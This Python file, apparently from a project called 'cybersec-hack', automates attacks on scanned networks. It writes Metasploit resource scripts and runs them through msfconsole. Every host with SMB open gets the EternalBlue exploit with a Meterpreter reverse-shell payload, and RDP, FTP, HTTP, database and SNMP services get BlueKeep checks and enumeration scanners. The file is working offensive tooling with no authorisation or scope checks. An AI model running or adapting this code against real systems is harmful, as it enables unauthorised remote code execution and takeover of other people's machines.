# cybersec-hack/exploitation.py

import subprocess
import os

def run_metasploit_exploit(scan_results):
    print("[+] Exploitation automatique via Metasploit...")
    metasploit_script = "msf_script.rc"
    with open(metasploit_script, "w") as f:
        f.write("load auto_add_route\n")
        for host in scan_results:
            ip = host['ip']
            for port in host['ports']:
                if port['service'] == 'smb':
                    f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("set RPORT 445\n")
                    f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                    f.write("set LHOST 127.0.0.1\n")
                    f.write("set LPORT 4444\n")
                    f.write("exploit -j\n")
        f.write("exit\n")

    try:
        subprocess.run(["msfconsole", "-r", metasploit_script], check=True)
        print("[✓] Exploitation lancée avec succès.")
    except subprocess.CalledProcessError as e:
        print("[!] Erreur lors de l'exécution de Metasploit :", e)

def run_adaptive_exploitation(scan_results):
    print("[+] Début de l'exploitation ciblée en fonction des services détectés...")
    metasploit_script = "adaptive_msf_script.rc"
    with open(metasploit_script, "w") as f:
        f.write("load auto_add_route\n")
        for host in scan_results:
            ip = host['ip']
            for port in host['ports']:
                port_num = port['port']
                service = port['service']

                if service == 'smb' or port_num == '445':
                    f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("set RPORT 445\n")
                    f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                    f.write("set LHOST 127.0.0.1\n")
                    f.write("set LPORT 4444\n")
                    f.write("exploit -j\n")

                elif service == 'ftp' or port_num == '21':
                    f.write(f"use auxiliary/scanner/ftp/anonymous\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("run\n")

                elif service == 'rdp' or port_num == '3389':
                    f.write(f"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("set RPORT 3389\n")
                    f.write("run\n")

                elif service == 'http' or port_num in ['80', '8080', '443']:
                    f.write(f"use auxiliary/scanner/http/http_version\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("run\n")

                elif service == 'mysql' or port_num == '3306':
                    f.write(f"use auxiliary/scanner/mysql/mysql_version\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("run\n")

                elif service == 'mssql' or port_num == '1433':
                    f.write(f"use auxiliary/scanner/mssql/mssql_ping\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("run\n")

                elif service == 'snmp' or port_num == '161':
                    f.write(f"use auxiliary/scanner/snmp/snmp_enum\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write("run\n")

        f.write("exit\n")

    try:
        subprocess.run(["msfconsole", "-r", metasploit_script], check=True)
        print("[✓] Exploitation adaptative exécutée avec succès.")
    except subprocess.CalledProcessError as e:
        print("[!] Erreur dans l'exploitation ciblée :", e)
